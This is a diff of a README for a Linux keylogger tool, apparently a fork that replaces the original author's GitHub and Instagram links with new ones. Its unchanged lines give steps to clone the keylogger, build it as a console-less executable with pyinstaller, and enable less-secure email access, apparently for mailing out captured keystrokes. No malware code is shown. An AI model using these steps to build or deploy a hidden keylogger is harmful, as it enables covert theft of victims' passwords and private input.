@@ -2,7 +2,7 @@
 
 
 
-Instagram: [TMRSWRR](https://www.instagram.com/tmrswrr/)
+Instagram: [TRHACKNON](https://www.instagram.com/brig1d3sint3rn1ti0n1ll3s)
 
 
 
@@ -24,7 +24,7 @@ Note : You need to open your e-mail address to less secure application access,If
 
 
 ```bash
-git clone https://github.com/capture0x/Keylogger-for-linux/
+git clone https://github.com/trhacknon/Keylogger-for-linux/
 cd Keylogger-for-linux
 chmod -R 755 keylogger.py
 ```
@@ -44,6 +44,6 @@ pyinstaller --noconsole --onefile keylogger.py
 ## Bugs and enhancements
 
 This tool is for educational purposes only.
-For bug reports or enhancements, please open an [issue](https://github.com/capture0x/mailExtractor/issues) here.
+For bug reports or enhancements, please open an [issue](https://github.com/trhacknon/mailExtractor/issues) here.
 
 **Copyright 2020**
